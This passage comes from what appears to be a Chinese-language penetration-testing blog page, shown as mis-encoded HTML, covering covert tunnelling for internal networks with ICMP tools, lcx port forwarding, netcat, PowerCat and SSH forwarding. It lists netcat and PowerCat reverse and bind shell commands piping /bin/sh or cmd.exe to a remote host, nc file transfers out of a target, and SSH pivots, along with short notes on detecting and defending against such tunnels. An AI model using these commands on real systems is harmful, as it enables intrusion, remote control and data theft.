¸å¿ƒåŒº</p><ul><li>ç³»ç»Ÿ<ul><li>ä¸šåŠ¡ç³»ç»Ÿ</li><li>è¿ç»´ç›‘æ§ç³»ç»Ÿ</li><li>å®‰å…¨ç³»ç»Ÿ</li></ul></li><li>ç½‘æ®µ<ul><li>ä¸šåŠ¡ç½‘æ®µ</li><li>è¿ç»´ç›‘æ§ç½‘æ®µ</li><li>å®‰å…¨ç®¡ç†ç½‘æ®µ</li></ul></li></ul></li></ul><h2 id="éšè—é€šä¿¡éš§é“æŠ€æœ¯"><a href="#éšè—é€šä¿¡éš§é“æŠ€æœ¯" class="headerlink" title="éšè—é€šä¿¡éš§é“æŠ€æœ¯"></a>éšè—é€šä¿¡éš§é“æŠ€æœ¯</h2><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><h4 id="å¸¸ç”¨éš§é“åˆ—ä¸¾"><a href="#å¸¸ç”¨éš§é“åˆ—ä¸¾" class="headerlink" title="å¸¸ç”¨éš§é“åˆ—ä¸¾"></a>å¸¸ç”¨éš§é“åˆ—ä¸¾</h4><ul><li>ç½‘ç»œå±‚ï¼šIPv6 éš§é“ã€ICMP éš§é“ã€GRE éš§é“</li><li>ä¼ è¾“å±‚ï¼šTCP éš§é“ã€UDP éš§é“ã€å¸¸è§„ç«¯å£è½¬å‘</li><li>åº”ç”¨å±‚ï¼šSSH éš§é“ã€HTTP éš§é“ã€HTTPS éš§é“ã€DNS éš§é“</li></ul><h4 id="åˆ¤æ–­å†…ç½‘è¿é€šæ€§"><a href="#åˆ¤æ–­å†…ç½‘è¿é€šæ€§" class="headerlink" title="åˆ¤æ–­å†…ç½‘è¿é€šæ€§"></a>åˆ¤æ–­å†…ç½‘è¿é€šæ€§</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ICMP åè®®</span></span><br><span class="line">ping &lt;IP or åŸŸå&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> TCP åè®®</span></span><br><span class="line">nc &lt;IP PORT&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> HTTP åè®®</span></span><br><span class="line">curl &lt;IP:PORT&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> DNS åè®®</span></span><br><span class="line">nslookup www.baidu.com vps-ip  # Windows è‡ªå¸¦ DNS æ¢æµ‹å‘½ä»¤ï¼Œæ²¡æœ‰æŒ‡å®š vps-ip æ—¶ï¼Œä¼šä»ç³»ç»Ÿç½‘ç»œçš„ TCP/IP å±æ€§ä¸­è¯»å– DNS æœåŠ¡å™¨çš„åœ°å€</span><br><span class="line">dig @vps-ip www.baidu.com  #  Linux è‡ªå¸¦ DNS æ¢æµ‹å‘½ä»¤ï¼Œæ²¡æœ‰æŒ‡å®š vps-ip æ—¶ï¼Œä¼šä» /etc/resolv.conf æ–‡ä»¶ä¸­è¯»å–ç³»ç»Ÿé…ç½®çš„ DNS æœåŠ¡å™¨çš„åœ°å€</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æƒ…å†µæµé‡ä¸èƒ½ç›´æ¥æµå‡ºï¼Œéœ€è¦åœ¨å†…ç½‘ä¸­è®¾ç½®ä»£ç†æœåŠ¡å™¨ã€‚å¸¸è§äºé€šè¿‡ä¼ä¸šåŠå…¬ç½‘æ®µä¸Šç½‘çš„åœºæ™¯ï¼Œå¸¸ç”¨åˆ¤æ–­æ–¹æ³•ï¼š</p><ul><li><p>æŸ¥çœ‹ç½‘ç»œè¿æ¥ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸å…¶ä»–æœºå™¨çš„ 8080ï¼ˆä¸ç»å¯¹ï¼‰ç­‰ç«¯å£çš„é“¾æ¥ï¼ˆå¯ä»¥å°è¯•è¿è¡Œ <code>ping -n 1 -a ip</code>ï¼‰</p></li><li><p>æŸ¥çœ‹å†…ç½‘ä¸­æ˜¯å¦æœ‰ä¸»æœºåç±»ä¼¼äº <code>proxy</code> çš„æœºå™¨</p></li><li><p>æŸ¥çœ‹ IE æµè§ˆå™¨çš„ç›´æ¥ä»£ç†</p></li><li><p>æ ¹æ® pac æ–‡ä»¶çš„è·¯å¾„ï¼ˆå¯èƒ½æ—¶æœ¬åœ°è·¯å¾„ï¼Œä¹Ÿå¯èƒ½æ—¶è¿œç¨‹è·¯å¾„ï¼‰ï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥å¹¶æŸ¥çœ‹</p></li><li><p>åˆ©ç”¨ curl å‘½ä»¤è¿›è¡Œç¡®è®¤ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com  # ä¸é€š</span><br><span class="line">curl -x proxy-ip:port www.baidu.com  # é€š</span><br></pre></td></tr></table></figure></li></ul><h3 id="ç½‘ç»œå±‚éš§é“æŠ€æœ¯"><a href="#ç½‘ç»œå±‚éš§é“æŠ€æœ¯" class="headerlink" title="ç½‘ç»œå±‚éš§é“æŠ€æœ¯"></a>ç½‘ç»œå±‚éš§é“æŠ€æœ¯</h3><h4 id="IPv6-éš§é“"><a href="#IPv6-éš§é“" class="headerlink" title="IPv6 éš§é“"></a>IPv6 éš§é“</h4><p>é…ç½®ï¼š<a href="https://lesca.me/archives/how-to-build-ipv6-tunnel-on-windows.html">https://lesca.me/archives/how-to-build-ipv6-tunnel-on-windows.html</a></p><p>æ”¯æŒå·¥å…·</p><ul><li>socat</li><li>6tunnel</li><li>nt6tunnel</li></ul><h4 id="ICMP-éš§é“"><a href="#ICMP-éš§é“" class="headerlink" title="ICMP éš§é“"></a>ICMP éš§é“</h4><p>å¸¸ç”¨å·¥å…·</p><ul><li><p>icmpshï¼š<a href="https://github.com/inquisb/icmpsh.git">https://github.com/inquisb/icmpsh.git</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1  # å…³é—­æœ¬åœ°ç³»ç»Ÿ ICMP åº”ç­”ï¼Œé˜²æ­¢ shell è¿è¡Œä¸ç¨³å®šï¼Œæ¢å¤åˆ™è®¾ç½®ä¸º 0</span><br></pre></td></tr></table></figure></li><li><p>PingTunnelï¼š<a href="http://freshmeat.sourceforge.net/projects/ptunnel/">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p></li><li><p>icmptunnel</p></li><li><p>powershell icmp</p></li></ul><p>é˜²å¾¡æ–¹æ³•</p><ul><li>æ£€æµ‹åŒä¸€æ¥æºçš„ ICmp æ•°æ®åŒ…çš„æµé‡ï¼Œä¸€ä¸ªæ­£å¸¸çš„ ping å‘½ä»¤æ¯ç§’æœ€å¤šå‘é€ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œè€Œä½¿ç”¨ ICMP éš§é“çš„æµè§ˆå™¨ä¼šåœ¨å¾ˆçŸ­çš„æ—¶é—´å†…äº§ç”Ÿä¸Šåƒä¸ª ICMP æ•°æ®åŒ…</li><li>æ³¨æ„é‚£äº› Payload å¤§äº 64bit çš„ICMP æ•°æ®åŒ…</li><li>å¯»æ‰¾å“åº”æ•°æ®åŒ…ä¸­çš„ Payload ä¸è¯·æ±‚æ•°æ®åŒ…ä¸­çš„ Payload ä¸ä¸€è‡´çš„ ICMP æ•°æ®åŒ…</li><li>æ£€æŸ¥ ICMP æ•°æ®åŒ…çš„åè®®æ ‡ç­¾ï¼Œä¾‹å¦‚ icmptunnel ä¼šåœ¨æ‰€æœ‰çš„ ICMP Payload å‰é¢æ·»åŠ  <code>TUNL</code> æ ‡è®°æ¥æ ‡è¯†éš§é“</li></ul><h3 id="ä¼ è¾“å±‚éš§é“æŠ€æœ¯"><a href="#ä¼ è¾“å±‚éš§é“æŠ€æœ¯" class="headerlink" title="ä¼ è¾“å±‚éš§é“æŠ€æœ¯"></a>ä¼ è¾“å±‚éš§é“æŠ€æœ¯</h3><h4 id="lcx-ç«¯å£è½¬å‘"><a href="#lcx-ç«¯å£è½¬å‘" class="headerlink" title="lcx ç«¯å£è½¬å‘"></a>lcx ç«¯å£è½¬å‘</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. å†…ç½‘ç«¯å£è½¬å‘</span></span><br><span class="line">lcx.exe -slave &lt;å…¬ç½‘ä¸»æœºIP&gt; 4444 127.0.0.1 3389  # ç›®æ ‡æœºå™¨æ‰§è¡Œï¼Œå°†ç›®æ ‡æœºå™¨ 3389 æ‰€æœ‰æ•°æ®è½¬å‘åˆ°å…¬ç½‘ VPS çš„ 4444 ç«¯å£</span><br><span class="line">lcx.exe -listen 4444 5555  # VPS æ‰§è¡Œï¼Œå°†æœ¬æœº 4444 ç«¯å£ä¸Šç›‘å¬çš„æ‰€æœ‰æ•°æ®è½¬å‘åˆ°æœ¬æœºçš„ 5555 ç«¯å£ä¸Š</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># æ­¤æ—¶ï¼Œç”¨ mstsc ç™»å½• `&lt;å…¬ç½‘ä¸»æœºIP&gt;:5555`ï¼Œæˆ–è€…åœ¨ VPS ä¸Šç”¨ mstsc ç™»å½•ä¸»æœº `127.0.0.1:5555` å³å¯è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„ 3389 ç«¯å£</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. æœ¬åœ°ç«¯å£æ˜ å°„</span></span><br><span class="line">lcx.exe -tran 53 &lt;ç›®æ ‡æœºå™¨IP&gt; 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># å½“éƒ¨åˆ†ç«¯å£ï¼ˆå¦‚ 3389ï¼‰çš„æ•°æ®æ— æ³•é€šè¿‡é˜²ç«å¢™ï¼Œå¯ä»¥å°†ç›¸åº”ç«¯å£çš„æ•°æ®é€ä¼ åˆ°é˜²ç«å¢™å…è®¸çš„å…¶ä»–ç«¯å£ï¼ˆå¦‚ 53ï¼‰</span></span></span><br></pre></td></tr></table></figure><h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. ç®€å•ä½¿ç”¨</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ï¼ˆ1ï¼‰å‘½ä»¤æŸ¥è¯¢</span></span></span><br><span class="line">nc -h</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ï¼ˆ2ï¼‰Banner æŠ“å–</span></span></span><br><span class="line">nc -nv IP 21</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ï¼ˆ3ï¼‰è¿æ¥è¿œç¨‹ä¸»æœº</span></span></span><br><span class="line">nc -nvv IP 80</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ï¼ˆ4ï¼‰ç«¯å£æ‰«æ</span></span></span><br><span class="line">nc -v IP 80</span><br><span class="line">nc -v -z IP 20-1024  # æ‰«ææŒ‡å®šä¸»æœºçš„æŸä¸ªç«¯å£æ®µï¼ˆæ‰«æé€Ÿåº¦å¾ˆæ…¢ï¼‰</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ï¼ˆ5ï¼‰ç«¯å£ç›‘å¬</span></span></span><br><span class="line">nc -l -p 9999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ï¼ˆ6ï¼‰æ–‡ä»¶ä¼ è¾“</span></span></span><br><span class="line">nc -lp 333 &gt; 1.txt  # æœ¬åœ° VPS ä¸»æœºï¼Œç­‰å¾…è¿æ¥</span><br><span class="line">nc -vn IP 333 &lt; test.txt -q 1  # ç›®æ ‡ä¸»æœºï¼Œå»ºç«‹è¿æ¥</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ï¼ˆ7ï¼‰ç®€æ˜“èŠå¤©</span></span></span><br><span class="line">nc -l -p 888  # æœ¬åœ° VPS ä¸»æœºï¼Œç›‘å¬</span><br><span class="line">nc -vn IP 888  # ç›®æ ‡ä¸»æœº</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. è·å– shell</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ï¼ˆ1ï¼‰æ­£å‘ Shell</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## ç›‘å¬ç›®æ ‡ä¸»æœº 4444 ç«¯å£</span></span></span><br><span class="line">nc -lvp 4444 -e /bin/sh  # Linux</span><br><span class="line">nc -lvp 4444 -e C:\windows32\System32\cmd.exe  # Windows</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## æœ¬åœ°æˆ– VPS ä¸»æœºä¸Šè¿æ¥ç›®æ ‡ä¸»æœºçš„ 4444 ç«¯å£</span></span></span><br><span class="line">nc IP 4444</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ï¼ˆ2ï¼‰åå‘ Shell</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## æœ¬åœ°è·å– VPS ä¸»æœºä¸Šç›‘å¬æœ¬åœ° 9999 ç«¯å£</span></span></span><br><span class="line">nc -lvp 9999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## ç›®æ ‡ä¸»æœºè¿æ¥ VPS ä¸»æœº 9999 ç«¯å£</span></span></span><br><span class="line">nc IP 9999 -e /bin/sh</span><br><span class="line">nc IP 9999 -e C:\windows\System32\cmd.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. ç›®æ ‡ä¸»æœºæ²¡æœ‰ nc æ—¶åå‘è·å– Shell</span></span><br><span class="line">http://duitutu.cn/fuxk/shell.html</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. å†…ç½‘ä»£ç†</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># VPS ç›‘å¬ 3333 çŸ­è£¤</span></span></span><br><span class="line">nc -lvp 3333</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ç›®æ ‡ä¸»æœº</span></span></span><br><span class="line">nc -lvp 3333 -e /bin/sh</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># è¾¹ç•ŒæœåŠ¡å™¨</span></span></span><br><span class="line">nc -v vps-ip 3333 -c &quot;nc -v tar-ip 3333&quot;</span><br></pre></td></tr></table></figure><h5 id="nc-å‚æ•°"><a href="#nc-å‚æ•°" class="headerlink" title="nc å‚æ•°"></a>nc å‚æ•°</h5><ul><li>-dï¼šåå°æ¨¡å¼</li><li>-eï¼šç¨‹åºé‡å®šå‘</li><li>-g &lt;ç½‘å…³&gt;ï¼šè®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šå¯è®¾ç½® 8 ä¸ª</li><li>-G &lt;æŒ‡å‘å™¨æ•°ç›®&gt;ï¼šè®¾ç½®æºè·¯ç”±æŒ‡å‘å™¨çš„æ•°é‡ï¼Œå€¼ä¸º 4 çš„å€æ•°</li><li>-hï¼šåœ¨çº¿å¸®åŠ©</li><li>-i &lt;å»¶è¿Ÿç§’æ•°&gt;ï¼šè®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£</li><li>-lï¼šä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç®¡ç†å’Œæ§åˆ¶ä¼ å…¥çš„æ•°æ®</li><li>-nï¼šç›´æ¥ä½¿ç”¨ IP åœ°å€ï¼ˆä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ï¼‰</li><li>-o &lt;è¾“å‡ºæ–‡ä»¶&gt;ï¼šæŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠæ¥å¾€ä¼ è¾“çš„æ•°æ®è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—èŠ‚ç åä¿å­˜åœ¨è¯¥æ–‡ä»¶ä¸­</li><li>-p &lt;é€šä¿¡ç«¯å£&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£</li><li>-rï¼šéšæœºæŒ‡å®šæœ¬æœºä¸è¿œç¨‹ä¸»æœºçš„é€šä¿¡ç«¯å£</li><li>-s &lt;æºåœ°å€&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„ IP åœ°å€</li><li>-uï¼šä½¿ç”¨ UDP ä¼ è¾“åè®®</li><li>-vï¼šè¯¦ç»†è¾“å‡º</li><li>-w &lt;è¶…æ—¶ç§’æ•°&gt;ï¼šè®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´</li><li>-zï¼šå°†è¾“å…¥/è¾“å‡ºåŠŸèƒ½å…³é—­ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨</li></ul><h4 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h4><p><a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powercat.ps1  <span class="comment"># å¯¼å…¥</span></span><br><span class="line">powercat <span class="literal">-h</span></span><br><span class="line"><span class="comment"># 1. é€šè¿‡ nc æ­£å‘è¿æ¥ PowerCat</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span>  <span class="comment"># ç›®æ ‡æœºå™¨ç›‘å¬ -lï¼šç›‘å¬æ¨¡å¼ï¼Œç”¨äºå…¥ç«™è¿æ¥ -pï¼šæŒ‡å®šç›‘å¬ç«¯å£ -eï¼šæŒ‡å®šè¦å¯åŠ¨è¿›ç¨‹çš„åç§° -vï¼šæ˜¾ç¤ºè¯¦æƒ…</span></span><br><span class="line">nc tar<span class="literal">-IP</span> <span class="number">2333</span> <span class="literal">-vv</span>  <span class="comment"># æœ¬åœ°æœºå™¨è·å¾— shell</span></span><br><span class="line"><span class="comment"># 2. é€šè¿‡ nc åå‘è¿æ¥ PowerCat</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-vv</span>  <span class="comment"># æœ¬åœ°æœºå™¨ç›‘å¬å¹¶æ¥æ”¶ shell</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br><span class="line"><span class="comment"># 3. é€šè¿‡ PowerCat è¿”å› PowerShell</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span>  <span class="comment"># æœ¬åœ°ä¸»æœºç›‘å¬</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span>- ep  <span class="comment"># ç›®æ ‡ä¸»æœºï¼Œ-eqï¼šç”¨äºè¿”å› PowerShell</span></span><br><span class="line"><span class="comment"># 4. é€šè¿‡ PowerCat ä¼ è¾“æ–‡ä»¶</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-of</span> test.txt <span class="literal">-v</span>  <span class="comment"># æœ¬åœ°ä¸»æœº</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-i</span> C:\test.txt <span class="literal">-v</span>  <span class="comment"># ç›®æ ‡ä¸»æœº</span></span><br><span class="line"><span class="comment">## ä¼ è¾“å®Œæ¯•åè¿æ¥ä¸ä¼šè‡ªåŠ¨æ–­å¼€ï¼Œå¯ä»¥åœ¨æœ¬åœ°æ–‡ä»¶æœ«å°¾è¿½åŠ éœ€è¦çš„å†…å®¹ï¼Œ-iï¼šè¾“å…¥ï¼Œå¯ä»¥å†™æ–‡ä»¶åï¼Œä¹Ÿå¯ä»¥ç›´æ¥å†™å­—ç¬¦ä¸² -ofï¼šè¾“å…¥æ–‡ä»¶åï¼Œå¯ä»¥åœ¨æ–‡ä»¶åå‰æ·»åŠ è·¯å¾„</span></span><br><span class="line"><span class="comment"># 5. ç”¨ PowerCat ç”Ÿæˆ Payload</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-e</span> cmd <span class="literal">-v</span> <span class="literal">-g</span> &gt;&gt; shell.ps1  <span class="comment"># æœ¬åœ°ç”Ÿæˆï¼Œåå¼¹ cmd</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-ep</span> <span class="literal">-v</span> <span class="literal">-g</span> &gt;&gt; shell.ps1  <span class="comment"># æœ¬åœ°ç”Ÿæˆï¼Œåå¼¹ powershell</span></span><br><span class="line"><span class="comment">## ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨å¹¶æ‰§è¡Œ</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span>  <span class="comment"># æœ¬åœ°æ¥æ”¶ shell</span></span><br></pre></td></tr></table></figure><h3 id="åº”ç”¨å±‚éš§é“æŠ€æœ¯"><a href="#åº”ç”¨å±‚éš§é“æŠ€æœ¯" class="headerlink" title="åº”ç”¨å±‚éš§é“æŠ€æœ¯"></a>åº”ç”¨å±‚éš§é“æŠ€æœ¯</h3><h4 id="SSH-åè®®"><a href="#SSH-åè®®" class="headerlink" title="SSH åè®®"></a>SSH åè®®</h4><p>åˆ›å»º SSH éš§é“çš„å¸¸ç”¨å‚æ•°</p><ul><li>-Cï¼šå‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦</li><li>-fï¼šå°† SSH ä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰çš„ Shell</li><li>-Nï¼šå»ºç«‹é™é»˜è¿æ¥ï¼ˆå»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰</li><li>-gï¼šå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£</li><li>-Lï¼šæœ¬åœ°ç«¯å£è½¬å‘</li><li>-Rï¼šè¿œç¨‹ç«¯å£è½¬å‘</li><li>-Dï¼šåŠ¨æ€è½¬å‘ï¼ˆSOCKS ä»£ç†ï¼‰</li><li>-Pï¼šæŒ‡å®š SSH ç«¯å£</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. æœ¬åœ°è½¬å‘</span></span><br><span class="line">ssh -CfNg -L vps-PORT:tar-IP:tar-PORT root@jump-IP</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ä»¥ä¸€ä¸ªå¤–ç½‘ Web æœåŠ¡å™¨ä¸ºè·³æ¿æœºï¼Œå°†å†…ç½‘ç›®æ ‡æœºå™¨çš„æŸä¸ªç«¯å£æ˜ å°„åˆ° VPS æœºå™¨çš„æŸä¸ªç«¯å£å—ï¼Œå†è®¿é—® VPS çš„å¯¹åº”ç«¯å£å°±ç›¸å½“äºè®¿é—®å†…ç½‘ç›®æ ‡æœºå™¨çš„å¯¹åº”ç«¯å£ï¼Œåœ¨ VPS ä¸Šæ‰§è¡Œ netstat -tulnp | grep &quot;1153&quot; æ¥æŸ¥çœ‹ vps-PORT ç«¯å£æ˜¯å¦å·²ç»è¿æ¥ï¼Œç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œåœ¨ VPS ä¸­è®¿é—® 1153 ç«¯å£</span></span></span><br><span class="line">rdesktop 127.0.0.1:vps-PORT</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. è¿œç¨‹è½¬å‘</span></span><br><span class="line">ssh -CfNg -R vps-PORT:tar-IP:tar-PORT root@jump-IP</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ä»¥ä¸€ä¸ªå¤–ç½‘ Web æœåŠ¡å™¨ä¸ºè·³æ¿æœºï¼Œå°† VPS æŸä¸ªç«¯å£çš„æµé‡è½¬å‘åˆ°å†…ç½‘ç›®æ ‡æœºå™¨çš„æŸä¸ªç«¯å£ï¼Œç„¶åè®¿é—® VPS çš„å¯¹åº”ç«¯å£ï¼Œå°±å¯ä»¥è®¿é—®å†…ç½‘ç›®æ ‡æœºå™¨çš„å¯¹åº”ç«¯å£äº†ï¼Œåœ¨VPS ä¸Šè®¿é—® vps-PORT ç«¯å£</span></span></span><br><span class="line">rdesktop 127.0.0.1:vps-PORT</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. åŠ¨æ€è½¬å‘</span></span><br><span class="line">ssh -CfNg -D vps-PORT root@jump-IP  # åœ¨ VPS ä¸Šæ‰§è¡Œï¼Œå»ºç«‹ä¸€ä¸ªåŠ¨æ€ SOCKS4/5 ä»£ç†éš§é“</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ç„¶åæ‰“å¼€æµè§ˆå™¨è®¾ç½®ä»£ç†ï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—®å†…ç½‘</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># åŠ¨æ€ç«¯å£æ˜ å°„å°±æ˜¯å»ºç«‹ä¸€ä¸ª SSH åŠ å¯†çš„ SOCKS4/5 ä»£ç†é€šé“ï¼Œä»»ä½•æ”¯æŒ SOCKS4/5 åè®®çš„ç¨‹åºéƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠ å¯†é€šé“è¿›è¡Œä»£ç†è®¿é—®</span></span></span><br></pre></td></tr></table></figure><p><strong>é˜²å¾¡ SSH éš§é“æ”»å‡»çš„æ€è·¯</strong></p><p>ä¸»è¦æ˜¯å› ä¸ºç³»ç»Ÿè®¿é—®æ§åˆ¶æªæ–½ä¸å¤Ÿ</p><ul><li>åœ¨ç³»ç»Ÿä¸­é…ç½® SSH è¿œç¨‹ç®¡ç†ç™½åå•</li><li>åœ¨ ACL ä¸­é™åˆ¶åªæœ‰ç‰¹å®šçš„ IP åœ°å€æ‰èƒ½è¿æ¥ SSH</li><li>è®¾ç½®ç³»ç»Ÿå®Œå…¨ä½¿ç”¨å¸¦å¤–ç®¡ç†</li></ul><p>å¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„èµ„æºæ¥å»ºç«‹å¸¦å¤–ç®¡ç†çš„ç½‘ç»œç»“æ„ï¼Œåœ¨å†…ç½‘ä¸­è‡³å°‘è¦é™åˆ¶ SSH è¿œç¨‹ç™»é™†çš„åœ°å€å’ŒåŒå‘è®¿é—®æ§åˆ¶ç­–ç•¥</p><h4 id="HTTP-HTTPS-åè®®"><a href="#HTTP-HTTPS-åè®®" class="headerlink" title="HTTP/HTTPS åè®®"></a>HTTP/HTTPS åè®®</h4><p>å¸¸ç”¨å·¥å…·</p><ul><li>reGeorgï¼š<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></li><li>meterpreter</li><li>tunna</li></ul><h4 